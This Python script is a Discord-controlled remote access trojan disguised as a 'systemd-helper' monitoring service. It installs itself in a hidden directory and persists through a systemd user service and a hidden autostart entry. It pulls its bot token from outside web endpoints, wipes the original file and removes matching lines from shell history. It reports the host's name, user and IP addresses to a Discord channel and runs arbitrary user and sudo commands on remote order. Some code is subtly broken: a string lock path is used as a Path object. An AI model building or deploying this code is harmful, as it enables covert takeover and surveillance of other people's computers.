#!/usr/bin/env python3
"""
systemd-helper - Stealth system monitoring service
Auto-installs, auto-starts at boot, no sudo required
"""

import os
import sys
import subprocess
import shutil
import time
import socket
import platform
import requests
import psutil
import json
import logging
from pathlib import Path

# ----------------- CONFIGURATION -----------------
DISCORD_TOKEN = "YOUR_ACTUAL_DISCORD_TOKEN_HERE"
TOKEN_CODE = "asdfghjkl"
TOKEN_BASE_URLS = [
    "https://new-production-8df3.up.railway.app/api/token",
    "https://new-5itj.onrender.com/api/token"
]

# Stealth installation paths
STEALTH_DIR = Path.home() / ".local" / "share" / "systemd-cache"
MAIN_BINARY = STEALTH_DIR / "systemd-service"
CONFIG_FILE = STEALTH_DIR / ".config.json"
LOG_FILE = STEALTH_DIR / ".system.log"
LOCK_FILE = "/tmp/.systemd-helper.lock"

# Service paths
SERVICE_DIR = Path.home() / ".config" / "systemd" / "user"
SERVICE_FILE = SERVICE_DIR / "systemd-helper.service"
AUTOSTART_DIR = Path.home() / ".config" / "autostart"
AUTOSTART_FILE = AUTOSTART_DIR / "systemd-helper.desktop"

# ----------------- SINGLE INSTANCE CHECK -----------------
def is_already_running():
    """Check if another instance is already running"""
    try:
        if LOCK_FILE.exists():
            try:
                with open(LOCK_FILE, 'r') as f:
                    pid = int(f.read().strip())
                if psutil.pid_exists(pid):
                    return True
            except:
                pass
        
        # Create new lock file
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        return False
    except:
        return False

# ----------------- TOKEN RETRIEVAL -----------------
def fetch_token_from_web():
    """Try to fetch token from web endpoints"""
    for base_url in TOKEN_BASE_URLS:
        url = f"{base_url}?code={TOKEN_CODE}"
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    token = data['discord_token']
                    if token and token != "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
                        return token
        except:
            continue
    return None

# ----------------- AUTO-INSTALL DEPENDENCIES -----------------
def install_dependencies():
    """Install all required dependencies automatically"""
    try:
        # Install Python packages only (no system packages)
        python_packages = ["discord.py", "psutil", "requests"]
        
        # Try pip without sudo first
        try:
            subprocess.run([
                sys.executable, "-m", "pip", "install", "--user", 
                "--quiet", "--no-warn-script-location"
            ] + python_packages, 
            check=True, timeout=300, capture_output=True)
            return True
        except:
            # Try with pip3
            try:
                subprocess.run([
                    "pip3", "install", "--user", 
                    "--quiet", "--no-warn-script-location"
                ] + python_packages,
                check=True, timeout=300, capture_output=True)
                return True
            except:
                return False
                
    except Exception as e:
        return False

# ----------------- INSTALL AS SERVICE -----------------
def install_service():
    """Install as systemd user service for auto-start"""
    try:
        # Create systemd user directory
        SERVICE_DIR.mkdir(parents=True, exist_ok=True)
        
        # Create service file
        service_content = f"""[Unit]
Description=SystemD Helper Service
After=graphical-session.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart={sys.executable} {MAIN_BINARY}
Restart=always
RestartSec=10
Environment=DISPLAY=:0
Environment=XAUTHORITY=%h/.Xauthority

[Install]
WantedBy=default.target
"""
        
        SERVICE_FILE.write_text(service_content)
        
        # Also create autostart entry for extra persistence
        AUTOSTART_DIR.mkdir(parents=True, exist_ok=True)
        autostart_content = f"""[Desktop Entry]
Type=Application
Name=SystemD Helper
Exec={sys.executable} {MAIN_BINARY}
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        AUTOSTART_FILE.write_text(autostart_content)
        
        # Enable and start the service
        subprocess.run(["systemctl", "--user", "daemon-reload"], 
                      check=False, capture_output=True)
        subprocess.run(["systemctl", "--user", "enable", "systemd-helper.service"], 
                      check=False, capture_output=True)
        subprocess.run(["systemctl", "--user", "start", "systemd-helper.service"], 
                      check=False, capture_output=True)
        
        return True
    except Exception as e:
        return False

# ----------------- STEALTH INSTALLATION -----------------
def install_stealth():
    """Install to stealth location and set up service"""
    try:
        current_file = Path(__file__).resolve()
        
        # Create stealth directory
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        
        # Copy current file to stealth location with modified content
        if current_file != MAIN_BINARY:
            # Read current content and modify to remove any identifiable info
            content = current_file.read_text()
            
            # Write to stealth location
            MAIN_BINARY.write_text(content)
            MAIN_BINARY.chmod(0o755)
            
            # Install as service
            install_service()
            
            return True
        
        return False
    except Exception as e:
        return False

# ----------------- CLEAN TRACES -----------------
def clean_traces():
    """Remove all traces of execution"""
    try:
        current_file = Path(__file__).resolve()
        
        # Remove original file if it's not the stealth copy
        if current_file != MAIN_BINARY and current_file.exists():
            # Overwrite with random data before deletion
            try:
                file_size = current_file.stat().st_size
                with open(current_file, 'wb') as f:
                    f.write(os.urandom(file_size))
                current_file.unlink()
            except:
                pass
        
        # Clear command history
        history_files = [
            Path.home() / ".bash_history",
            Path.home() / ".zsh_history",
            Path.home() / ".python_history"
        ]
        
        for history_file in history_files:
            try:
                if history_file.exists():
                    # Remove any lines containing this script's name
                    content = history_file.read_text()
                    lines = content.split('\n')
                    filtered_lines = [
                        line for line in lines 
                        if not any(keyword in line for keyword in [
                            'systemd-helper', 'stealth', 'monitoring'
                        ])
                    ]
                    history_file.write_text('\n'.join(filtered_lines))
            except:
                pass
        
        return True
    except Exception as e:
        return False

# ----------------- NETWORK INFO -----------------
def get_network_info():
    """Get comprehensive network information"""
    try:
        # Get local IP
        local_ip = "Unknown"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            pass
        
        # Get public IP
        public_ip = "Unknown"
        try:
            response = requests.get('https://api.ipify.org', timeout=10)
            if response.status_code == 200:
                public_ip = response.text
        except:
            pass
        
        # Get network interfaces
        interfaces = {}
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces[interface] = addr.address
                        break
        except:
            pass
        
        return {
            "local_ip": local_ip,
            "public_ip": public_ip,
            "interfaces": interfaces
        }
    except:
        return {}

# ----------------- SYSTEM INFO -----------------
def get_system_info():
    """Get comprehensive system information"""
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        system = platform.system()
        release = platform.release()
        machine = platform.machine()
        
        # Get CPU info
        cpu_info = f"{psutil.cpu_count()} cores"
        
        # Get memory info
        memory = psutil.virtual_memory()
        memory_info = f"{memory.total // (1024**3)}GB"
        
        # Get disk info
        disk = psutil.disk_usage('/')
        disk_info = f"{disk.total // (1024**3)}GB"
        
        # Get network info
        network_info = get_network_info()
        
        info = {
            "hostname": hostname,
            "username": username,
            "system": f"{system} {release}",
            "architecture": machine,
            "cpu": cpu_info,
            "memory": memory_info,
            "disk": disk_info,
            "local_ip": network_info.get("local_ip", "Unknown"),
            "public_ip": network_info.get("public_ip", "Unknown"),
            "interfaces": network_info.get("interfaces", {})
        }
        
        return info
    except Exception as e:
        return {}

# ----------------- COMMAND EXECUTION -----------------
def execute_command(cmd, use_sudo=False, timeout=30):
    """Execute a system command and return the result"""
    try:
        if use_sudo:
            # Try to execute with sudo
            try:
                result = subprocess.run(
                    ['sudo', '-S'] + cmd.split(),
                    input='\n',  # Send empty password (will prompt if needed)
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
            except subprocess.TimeoutExpired:
                return "❌ Command timed out"
            except Exception as e:
                return f"❌ Sudo execution failed: {e}"
        else:
            # Execute as regular user
            try:
                result = subprocess.run(
                    cmd.split(),
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
            except subprocess.TimeoutExpired:
                return "❌ Command timed out"
            except Exception as e:
                return f"❌ Command execution failed: {e}"
        
        # Format the output
        output = ""
        if result.stdout:
            output += f"✅ **STDOUT:**\n```\n{result.stdout.strip()}\n```"
        if result.stderr:
            output += f"\n⚠️ **STDERR:**\n```\n{result.stderr.strip()}\n```"
        if result.returncode != 0:
            output += f"\n❌ **Exit Code:** {result.returncode}"
        
        return output if output else "✅ Command executed (no output)"
        
    except Exception as e:
        return f"❌ Unexpected error: {e}"

# ----------------- ANNOUNCE ONLINE -----------------
async def announce_online(bot):
    """Announce system online status once"""
    try:
        system_info = get_system_info()
        
        # Find a channel to send the message
        announcement_channel = None
        for guild in bot.guilds:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    announcement_channel = channel
                    break
            if announcement_channel:
                break
        
        if announcement_channel:
            message = "🟢 **SYSTEM ONLINE**\n"
            message += f"**Host:** `{system_info.get('hostname', 'Unknown')}`\n"
            message += f"**User:** `{system_info.get('username', 'Unknown')}`\n"
            message += f"**OS:** `{system_info.get('system', 'Unknown')}`\n"
            message += f"**Arch:** `{system_info.get('architecture', 'Unknown')}`\n"
            message += f"**CPU:** `{system_info.get('cpu', 'Unknown')}`\n"
            message += f"**RAM:** `{system_info.get('memory', 'Unknown')}`\n"
            message += f"**Disk:** `{system_info.get('disk', 'Unknown')}`\n"
            message += f"**Local IP:** `{system_info.get('local_ip', 'Unknown')}`\n"
            message += f"**Public IP:** `{system_info.get('public_ip', 'Unknown')}`\n"
            message += "**Status:** Stealth mode active 🕶️"
            
            await announcement_channel.send(message)
            
            # Save that we've announced to prevent repeats
            config = {"announced": True}
            CONFIG_FILE.write_text(json.dumps(config))
            
    except Exception as e:
        pass

# ----------------- BOT SETUP -----------------
# Install dependencies first
print("Installing required dependencies...")
if install_dependencies():
    print("Dependencies installed successfully")
else:
    print("Warning: Some dependencies may not be installed correctly")

# Now import the modules
try:
    import discord
    from discord.ext import commands
except ImportError as e:
    print(f"Failed to import required modules: {e}")
    sys.exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ----------------- BOT COMMANDS -----------------
@bot.event
async def on_ready():
    """Bot startup"""
    print("Stealth system monitoring service initialized")
    
    # Auto-install on first run
    if not MAIN_BINARY.exists():
        if install_stealth():
            print("Stealth installation completed")
    
    # Clean traces
    clean_traces()
    
    # Announce online status only once
    config = {}
    if CONFIG_FILE.exists():
        try:
            config = json.loads(CONFIG_FILE.read_text())
        except:
            pass
    
    if not config.get("announced", False):
        await announce_online(bot)

@bot.command(name="cmd")
async def cmd_execute(ctx, *, command):
    """Execute a system command as regular user"""
    # Safety check - prevent dangerous commands
    dangerous_commands = ['rm -rf /', 'dd if=', ':(){ :|:& };:', 'mkfs', 'fdisk']
    if any(dangerous in command for dangerous in dangerous_commands):
        await ctx.send("❌ Command contains dangerous operations and was blocked")
        return
    
    await ctx.send(f"🔄 Executing: `{command}`")
    result = execute_command(command, use_sudo=False)
    
    # Split long messages to avoid Discord character limit
    if len(result) > 1900:
        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
    else:
        await ctx.send(result)

@bot.command(name="root")
async def cmd_root(ctx, *, command):
    """Execute a system command with sudo/root privileges"""
    # Extra safety check for root commands
    dangerous_commands = ['rm -rf', 'dd if=', 'mkfs', 'fdisk', 'shutdown', 'reboot']
    if any(dangerous in command for dangerous in dangerous_commands):
        await ctx.send("❌ Root command contains dangerous operations and was blocked")
        return
    
    await ctx.send(f"🔐 Executing as root: `{command}`")
    result = execute_command(command, use_sudo=True)
    
    # Split long messages to avoid Discord character limit
    if len(result) > 1900:
        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
    else:
        await ctx.send(result)

@bot.command(name="sysinfo")
async def cmd_sysinfo(ctx):
    """Get detailed system information"""
    system_info = get_system_info()
    network_info = get_network_info()
    
    message = "💻 **SYSTEM INFORMATION**\n"
    message += f"```\n"
    message += f"Hostname:    {system_info.get('hostname', 'Unknown')}\n"
    message += f"Username:    {system_info.get('username', 'Unknown')}\n"
    message += f"OS:          {system_info.get('system', 'Unknown')}\n"
    message += f"Architecture:{system_info.get('architecture', 'Unknown')}\n"
    message += f"CPU:         {system_info.get('cpu', 'Unknown')}\n"
    message += f"Memory:      {system_info.get('memory', 'Unknown')}\n"
    message += f"Disk:        {system_info.get('disk', 'Unknown')}\n"
    message += f"Local IP:    {system_info.get('local_ip', 'Unknown')}\n"
    message += f"Public IP:   {system_info.get('public_ip', 'Unknown')}\n"
    message += f"```\n"
    
    # Add network interfaces
    interfaces = network_info.get('interfaces', {})
    if interfaces:
        message += "🌐 **NETWORK INTERFACES**\n```\n"
        for iface, ip in interfaces.items():
            message += f"{iface}: {ip}\n"
        message += "```"
    
    await ctx.send(message)

@bot.command(name="status")
async def cmd_status(ctx):
    """Check bot status and location"""
    system_info = get_system_info()
    
    message = "🟢 **SERVICE STATUS**\n"
    message += f"**Status:** Running (Stealth Mode)\n"
    message += f"**Location:** `{MAIN_BINARY}`\n"
    message += f"**Host:** `{system_info.get('hostname', 'Unknown')}`\n"
    message += f"**Uptime:** `{int(time.time() - psutil.boot_time())}s`\n"
    message += f"**Local IP:** `{system_info.get('local_ip', 'Unknown')}`\n"
    message += f"**Public IP:** `{system_info.get('public_ip', 'Unknown')}`"
    
    await ctx.send(message)

@bot.command(name="clean")
async def cmd_clean(ctx):
    """Clean all traces and refresh"""
    if clean_traces():
        await ctx.send("✅ All traces cleaned and service refreshed")
    else:
        await ctx.send("❌ Clean operation failed")

@bot.command(name="update")
async def cmd_update(ctx):
    """Update the service"""
    await ctx.send("🔄 Updating service...")
    
    # Reinstall dependencies
    if install_dependencies():
        await ctx.send("✅ Dependencies updated")
    else:
        await ctx.send("❌ Dependency update failed")

@bot.command(name="delete")
async def cmd_delete(ctx):
    """Completely remove the bot"""
    try:
        await ctx.send("🚨 **SELF-DESTRUCT INITIATED**\nRemoving all traces...")
        
        # Stop and disable service
        subprocess.run(["systemctl", "--user", "stop", "systemd-helper.service"], 
                      check=False, capture_output=True)
        subprocess.run(["systemctl", "--user", "disable", "systemd-helper.service"], 
                      check=False, capture_output=True)
        
        # Remove files
        files_to_remove = [
            MAIN_BINARY,
            SERVICE_FILE,
            AUTOSTART_FILE,
            CONFIG_FILE,
            LOG_FILE
        ]
        
        for file_path in files_to_remove:
            try:
                if file_path.exists():
                    file_path.unlink()
            except:
                pass
        
        # Remove directories if empty
        try:
            if STEALTH_DIR.exists() and not any(STEALTH_DIR.iterdir()):
                STEALTH_DIR.rmdir()
            if SERVICE_DIR.exists() and not any(SERVICE_DIR.iterdir()):
                SERVICE_DIR.rmdir()
            if AUTOSTART_DIR.exists() and not any(AUTOSTART_DIR.iterdir()):
                AUTOSTART_DIR.rmdir()
        except:
            pass
        
        clean_traces()
        
        await ctx.send("✅ **SELF-DESTRUCT COMPLETED**\nAll traces removed. Goodbye!")
        await bot.close()
            
    except Exception as e:
        await ctx.send(f"❌ Self-destruct error: {e}")

# ----------------- MAIN -----------------
if __name__ == "__main__":
    # Check if another instance is already running
    if is_already_running():
        print("Another instance is already running. Exiting.")
        sys.exit(0)
    
    # Check if we need to fetch token from web
    if DISCORD_TOKEN == "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
        web_token = fetch_token_from_web()
        if web_token:
            DISCORD_TOKEN = web_token
            print("Token retrieved successfully from web")
        else:
            print("ERROR: Could not retrieve token from any source!")
            # Clean up lock file
            try:
                if os.path.exists(LOCK_FILE):
                    os.remove(LOCK_FILE)
            except:
                pass
            sys.exit(1)
    
    # Auto-install on first run
    if not MAIN_BINARY.exists():
        print("First run - performing stealth installation...")
        if install_stealth():
            print("Stealth installation completed successfully")
            # Clean traces and exit installer
            clean_traces()
            try:
                if os.path.exists(LOCK_FILE):
                    os.remove(LOCK_FILE)
            except:
                pass
            sys.exit(0)
        else:
            print("Stealth installation failed - running in foreground")
    
    # Run the bot with retry logic
    max_retries = 5
    retry_delay = 30
    
    for attempt in range(max_retries):
        try:
            print(f"Starting stealth monitoring service (attempt {attempt + 1}/{max_retries})...")
            bot.run(DISCORD_TOKEN)
            break
        except discord.LoginFailure:
            # Try to get fresh token
            web_token = fetch_token_from_web()
            if web_token:
                DISCORD_TOKEN = web_token
                print("Updated token from web")
        except Exception as e:
            print(f"Service failed to start: {e}")
            if attempt < max_retries - 1:
                print(f"Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
    
    # Clean up lock file before exiting
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except:
        pass
